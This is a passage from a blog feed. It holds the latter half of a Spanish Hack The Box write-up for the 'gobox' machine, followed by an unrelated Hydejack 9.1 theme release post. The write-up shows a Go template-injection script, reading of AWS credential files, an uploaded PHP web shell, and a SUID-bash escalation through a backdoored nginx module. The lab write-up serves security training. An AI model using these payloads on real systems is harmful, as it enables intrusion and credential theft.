<p>Con un “{{ . }}” obtenemos un correo y una contraseña por lo que lo usamos en el login y dentro encontramos una función que nos permite mediante el input inyectar comandos.</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">func</span> <span class="p">(</span><span class="n">u</span> <span class="n">User</span><span class="p">)</span> <span class="n">DebugCmd</span> <span class="p">(</span><span class="n">test</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
  <span class="n">ipp</span> <span class="o">:=</span> <span class="n">strings</span><span class="o">.</span><span class="n">Split</span><span class="p">(</span><span class="n">test</span><span class="p">,</span> <span class="s">" "</span><span class="p">)</span>
  <span class="n">bin</span> <span class="o">:=</span> <span class="n">strings</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">ipp</span><span class="p">[</span><span class="o">:</span><span class="m">1</span><span class="p">],</span> <span class="s">" "</span><span class="p">)</span>
  <span class="n">args</span> <span class="o">:=</span> <span class="n">strings</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">ipp</span><span class="p">[</span><span class="m">1</span><span class="o">:</span><span class="p">],</span> <span class="s">" "</span><span class="p">)</span>
  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">&gt;</span> <span class="m">0</span><span class="p">{</span>
    <span class="n">out</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="n">bin</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span><span class="o">.</span><span class="n">CombinedOutput</span><span class="p">()</span>
    <span class="k">return</span> <span class="kt">string</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">out</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="n">bin</span><span class="p">)</span><span class="o">.</span><span class="n">CombinedOutput</span><span class="p">()</span>
    <span class="k">return</span> <span class="kt">string</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Por el ssti nos permite llamar a objetos y funciones internas del código existente, por lo que pegamos la función y el comando para ejecutar comandos.</p>

<p><img src="/assets/img/machines/gobox/gobox5.png" alt="imagen5" /></p>

<p>En este punto para práctica nos montamos un script en python para poder ejecutar comandos más facilmente.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">os</span><span class="p">,</span> <span class="n">requests</span><span class="p">,</span> <span class="n">pdb</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">signal</span><span class="p">,</span> <span class="n">time</span>

<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">Saliendo...</span><span class="se">\n\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>


<span class="c1">#Variables Globales
</span><span class="n">main_url</span> <span class="o">=</span> <span class="s">"http://10.10.11.113:8080/forgot/"</span>

<span class="c1">#CTRL+C
</span><span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">makerequest</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
    <span class="n">data_post</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">'email'</span><span class="p">:</span><span class="s">"test@{\{ .DebugCmd "</span> <span class="o">%</span><span class="n">s</span> <span class="s">" }\}"</span> <span class="o">%</span> <span class="n">command</span>
    <span class="p">}</span>
    
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">main_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data_post</span><span class="p">)</span>

    <span class="n">output</span> <span class="o">=</span> <span class="p">((</span><span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'Email Sent To:(.*)\s+&lt;button class'</span><span class="p">,</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">DOTALL</span><span class="p">))[</span><span class="mi">0</span><span class="p">].</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n\n</span><span class="s">             "</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)).</span><span class="n">replace</span><span class="p">(</span><span class="s">"test@"</span><span class="p">,</span><span class="s">""</span><span class="p">)</span>

    <span class="k">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
    
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">)</span>
        <span class="n">command</span> <span class="o">=</span> <span class="n">command</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
        <span class="n">makerequest</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>      

</code></pre></div></div>

<p>Al hacer un <code class="language-plaintext highlighter-rouge">hostname -i</code> vemos que se llama <code class="language-plaintext highlighter-rouge">aws</code> por lo que procedemo a aplicar comando en aws. Nos encontramos credenciales en <code class="language-plaintext highlighter-rouge">.aws</code> y en <code class="language-plaintext highlighter-rouge">env</code> para que podamos conectarnos en nuestra máquina.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span><span class="nb">cat</span> ~/.aws/credentials
 <span class="o">[</span>default]
<span class="nv">aws_access_key_id</span><span class="o">=</span>SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
<span class="nv">aws_secret_access_key</span><span class="o">=</span>SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz

<span class="o">&gt;</span><span class="nb">env
 </span><span class="nv">HOSTNAME</span><span class="o">=</span>aws
<span class="nv">PWD</span><span class="o">=</span>/opt/uhc
<span class="nv">HOME</span><span class="o">=</span>/root
<span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span>SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
<span class="nv">SHLVL</span><span class="o">=</span>0
<span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span>SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
<span class="nv">DEBIAN_FRONTEND</span><span class="o">=</span>noninteractive
</code></pre></div></div>

<p>Nos conectamos desde nuestra máquina</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span>aws s3 <span class="nb">ls
 </span>2022-09-30 05:32:15 website

<span class="o">&gt;</span>aws s3 <span class="nb">ls </span>s3://website
                            PRE css/
2022-09-30 05:32:16    1294778 bottom.png
2022-09-30 05:32:15     165551 header.png
2022-09-30 05:32:15          5 index.html
2022-09-30 05:32:15       1803 index.php
</code></pre></div></div>

<p>Dentro de index.html vemos que dice test y yendo hacia la página principal y poniendo index.html nos pone test, por lo que podríamos subir un archivo para ejecutar comando en php.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?</span> <span class="s2">"&lt;pre&gt; .  shell_exec(</span><span class="nv">$_REQUEST['cmd']</span><span class="s2">) . "</span><span class="o">&lt;/</span><span class="n">pre</span><span class="o">&gt;</span><span class="p">;</span>
</code></pre></div></div>

<p>Mediante <code class="language-plaintext highlighter-rouge">base64</code> nos pasamos el contenido lo ponemos en la máquina víctima.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span>aws s3 <span class="nb">cp</span> /tmp/reverse.php s3://website/reverse.php
upload: ../../tmp/reverse.php to s3://website/reverse.php
</code></pre></div></div>

<p><img src="/assets/img/machines/gobox/gobox6.png" alt="imagen6" /></p>

<p>Nos entablamos una reverse shell y estamos dentro.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@gobox:/etc/nginx/modules-enabled<span class="nv">$ </span><span class="nb">ls
</span>50-backdoor.conf	      50-mod-http-xslt-filter.conf  50-mod-stream.conf
50-mod-http-image-filter.conf  50-mod-mail.conf
www-data@gobox:/etc/nginx/modules-enabled<span class="nv">$ </span><span class="nb">cat </span>50-backdoor.conf 
load_module modules/ngx_http_execute_module.so<span class="p">;</span>
www-data@gobox:/etc/nginx/modules-enabled<span class="nv">$ </span>find / <span class="nt">-name</span> ngx_http_execute_module.so 2&gt;/dev/null
/usr/lib/nginx/modules/ngx_http_execute_module.so
www-data@gobox:/etc/nginx/modules-enabled<span class="nv">$ </span>strings /usr/lib/nginx/modules/ngx_http_execute_module.so | <span class="nb">grep</span> <span class="s2">".run"</span>
ippsec.run
</code></pre></div></div>
<p>Vemos que la máquina había sido vulnerada antes, y tiene un archivo <code class="language-plaintext highlighter-rouge">ngx_http_execute_module.so</code> buscando en google se ve que se puede ejecutar comandos con curl, pero al hacer un strings al archivo
observamos que hay un <code class="language-plaintext highlighter-rouge">ippsec.run</code> que sustituye al system.run en curl.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@gobox:/etc/nginx/modules-enabled<span class="nv">$ </span>curl <span class="s1">'http://localhost:8000/?ippsec.run[whoami]'</span>
root
www-data@gobox:/etc/nginx/modules-enabled<span class="nv">$ </span>curl <span class="s2">"http://localhost:8000/?ippsec.run[chmod%204755%20%2fbin%2fbash]"</span>
curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server
www-data@gobox:/etc/nginx/modules-enabled<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /bin/bash
<span class="nt">-rwsr-xr-x</span> 1 root root 1183448 Jun 18  2020 /bin/bash
</code></pre></div></div>
<p>Hacemos un bash -p y estamos dentro como root.</p>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="machines" /><category term="htb" /><summary type="html"><![CDATA[Vemos el puerto 80 y 8080, donde en el puerto 80 no encontramos nada interesante pero en el 8080 encontramos un login.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/machines/axlle/axlle1.JPG" /><media:content medium="image" url="http://localhost:4000/assets/img/machines/axlle/axlle1.JPG" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">What’s New in Hydejack 9.1?</title><link href="http://localhost:4000/blog/example/2021-02-13-whats-new-in-hydejack-9-1/" rel="alternate" type="text/html" title="What’s New in Hydejack 9.1?" /><published>2021-02-13T00:00:00-06:00</published><updated>2021-02-13T00:00:00-06:00</updated><id>http://localhost:4000/blog/example/whats-new-in-hydejack-9-1</id><content type="html" xml:base="http://localhost:4000/blog/example/2021-02-13-whats-new-in-hydejack-9-1/"><![CDATA[<p>What’s New in Hydejack 9.1?</p>

<ul id="markdown-toc">
  <li><a href="#stripe-ified-design" id="markdown-toc-stripe-ified-design">Stripe-ified Design</a></li>
  <li><a href="#inverted-sidebars" id="markdown-toc-inverted-sidebars">Inverted Sidebars</a></li>
  <li><a href="#code-block-headers" id="markdown-toc-code-block-headers">Code Block Headers</a></li>
  <li><a href="#resume-download-buttons" id="markdown-toc-resume-download-buttons">Resume Download Buttons</a></li>
  <li><a href="#serp-breadcrumbs" id="markdown-toc-serp-breadcrumbs"><abbr title="Search Engine Results Page">SERP</abbr> Breadcrumbs</a></li>
  <li><a href="#last-modified-at" id="markdown-toc-last-modified-at">Last Modified At</a></li>
  <li><a href="#clap-button-preview" id="markdown-toc-clap-button-preview">Clap Button Preview</a></li>
  <li><a href="#credits" id="markdown-toc-credits">Credits</a></li>
</ul>

<h2 id="stripe-ified-design">Stripe-ified Design</h2>
<p>Most elements now have rounded borders, making the design look more modern (dare I say “Stripe-ified”) than ever before.</p>

<p>The goal of Hydejack was always to provide a theme that looks “designed” combined the amenities of a typical Jekyll theme for coders.
This is an important step in maintaining this goal.</p>

<p>At the same time, I’m introducing nerdy elements like <a href="#serp-breadcrumbs">breadcrumbs</a>, that are almost ornamental in nature.
You wouldn’t find these on other Stripe-like designs, but I think they are appealing to developer types like myself. 
Like most additions to Hydejack, they can be disabled via configuration.</p>

<h2 id="inverted-sidebars">Inverted Sidebars</h2>
<p>The colors on the sidebar can now be inverted to allow brighter sidebar images. This can be enabled per-page in the fort matter:</p>

<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">invert_sidebar</span><span class="pi">:</span> <span class="no">true</span>
</code></pre></div></div>

<h2 id="code-block-headers">Code Block Headers</h2>
<p>Code blocks can now have headers:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// file: 'hello-world.js'</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Hello World!</span><span class="dl">'</span><span class="p">);</span>
</code></pre></div></div>

<p>Headers are added by making the first line a comment of the form <code class="language-plaintext highlighter-rouge">(file|title): ['"].*['"]</code>, e.g.:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~~~js
// file: 'hello-world.js'
console.log('Hello World!');
~~~
</code></pre></div></div>

<p>Code blocks with and without headers now also come with a copy button. 
In the case of header-less code blocks, the button only shows on hover to prevent potential overlap.</p>

<h2 id="resume-download-buttons">Resume Download Buttons</h2>
<p>Resumes can now have download buttons:</p>

<p><img src="/assets/img/blog/9.1.0-3.png" alt="Download Buttons" class="border lead" width="1776" height="258" loading="lazy" /></p>

<p class="figcaption">Resumes can now have download buttons.</p>

<p>The documentation has been updated with a chapter on <a href="/docs/basics/#downloads">how to configure the buttons</a>.</p>

<h2 id="serp-breadcrumbs"><abbr title="Search Engine Results Page">SERP</abbr> Breadcrumbs</h2>
<p>Added breadcrumbs above page title:</p>

<p><img src="/assets/img/blog/9.1.0-2.png" alt="Breadcrumbs" class="border lead" width="1588" height="164" loading="lazy" /></p>

<p class="figcaption">Bread crumbs are now shown above each page title.</p>

<p>Note that this requires a <a href="https://qwtel.com/posts/software/urls-are-directories/">directory-like URL structure</a> on your entire site, 
otherwise the intermediate links will point to nonexisting sites.</p>

<p>On a side note, Hydejack now has built-in tooltips for abbreviations like <abbr title="Search Engine Results Page">SERP</abbr> (activated via tap/click).
See <a href="/blog/hyde/2012-02-07-example-content/#inline-html-elements">Example Content</a> on how to add them to your content.</p>

<h2 id="last-modified-at">Last Modified At</h2>
<p>Blog posts can now have a “last modified at” date in the sub title row.</p>

<p><img src="/assets/img/blog/9.1.0-1.png" alt="Last modified at" class="border lead" width="1254" height="218" loading="lazy" /></p>

<p>Note that this depends on the <code class="language-plaintext highlighter-rouge">last_modified_at</code> property of the page, which must be either set manually in the frontmatter (not recommended), or via a plugin like <a href="https://github.com/gjtorikian/jekyll-last-modified-at"><code class="language-plaintext highlighter-rouge">jekyll-last-modified-at</code></a>. Note that the later is not available when building on GitHub Pages and can increase build times.</p>

<h2 id="clap-button-preview">Clap Button Preview</h2>
<p>I’ve been trying something new with <a href="https://getclaps.app/"><strong>getclaps.app</strong></a>, a feedback and analytics tool for personal sites like those powered by Hydejack.</p>

<!-- <clap-button style="--clap-button-color:var(--body-color);margin:2rem auto 3rem;width:3rem;height:3rem;font-size:smaller" nowave></clap-button> -->

<p>It is a separate product from Hydejack and not enabled by default. Because it depends on a backend component, it requires a monthly fee. 
If enabled, it is placed below posts and pages where the dingbat character (❖) used to be.</p>

<p>I can’t claim that this product is fully baked (feedback welcome), but I’ve been using it on my personal site and here for the last couple of months with no issues.
For more, see <a href="https://getclaps.app/">the dedicated website</a>.</p>

<hr style="margin:2rem 0" />

<p>There are many more changes and bugfixes in 9.1. See the <a href="/CHANGELOG/" class="heading flip-title">CHANGELOG</a> for details.</p>

<h2 id="credits">Credits</h2>

<p><span>Photo by <a href="https://unsplash.com/@jjying?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">JJ Ying</a> on <a href="https://unsplash.com/?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></span></p>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="example" /><summary type="html"><![CDATA[Version 9.1 provides minor design changes, new features, and closes multiple issues.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/jj-ying.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/jj-ying.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>